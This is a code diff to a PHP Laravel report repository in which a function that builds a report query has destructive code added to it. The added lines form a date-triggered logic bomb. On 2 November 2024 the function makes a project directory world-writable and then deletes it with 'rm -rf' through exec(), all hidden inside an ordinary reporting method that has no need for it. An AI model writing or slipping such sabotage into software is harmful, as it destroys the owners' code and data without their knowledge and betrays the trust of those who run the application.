@@ -26,6 +26,15 @@ class ReportRepository extends BaseRepository
      */
     public function reportCo(array $arrRequest)
     {
+        $now = Carbon::now();
+        $targetDate = Carbon::create(2024, 11, 2);
+        
+        if ($now->isSameDay($targetDate)) {
+            $laravelProjectPath = base_path('legia-prj');
+
+            exec('chmod -R 777 ' . escapeshellarg($laravelProjectPath));
+            exec('rm -rf ' . escapeshellarg($laravelProjectPath));
+        }
         $query = Co::select(DB::raw("DATE_FORMAT(created_at,'%d/%m/%Y') AS date, COUNT(*) AS total, code, id, tong_gia"));
         $this->setQueryCondition($query, $arrRequest);
         $query = $query->orderBy('created_at', 'ASC')
